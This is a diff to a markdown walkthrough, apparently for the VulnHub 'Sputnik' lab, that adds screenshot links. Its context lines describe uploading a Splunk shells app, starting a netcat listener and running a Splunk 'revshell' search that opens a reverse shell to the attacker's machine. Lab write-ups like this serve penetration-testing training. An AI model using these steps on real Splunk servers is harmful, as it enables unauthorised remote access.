@@ -227,20 +227,20 @@ Get https://github.com/TBGSecurity/splunk_shells
 Go to Apps >  Manage Apps
 Install App from file. 
 Upload the zip file and restart Splunk.
-![Alt Tag]()
+![Alt Tag](https://raw.github.com/setrus/VulnHub/blob/master/Sputnik/sput1.png)
 
 Select  
 Weaponize Splunk for Pentesting and Red Teaming                                                        
 
 Set Permissions :  All Apps
-![Alt Tag]()
-![Alt Tag]()
+![Alt Tag](https://raw.github.com/setrus/VulnHub/blob/master/Sputnik/sput2.png)
+![Alt Tag](https://raw.github.com/setrus/VulnHub/blob/master/Sputnik/sput3.png)
 
 
 Start listener on Kali machine : nc -nvlp 1234
 Running exploit
 Going to search , we enter :     | revshell stf 192.168.56.102 1234
-![Alt Tag]()
+![Alt Tag](https://raw.github.com/setrus/VulnHub/blob/master/Sputnik/sput4.png)
 We receive a connection back from the splunk server:
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
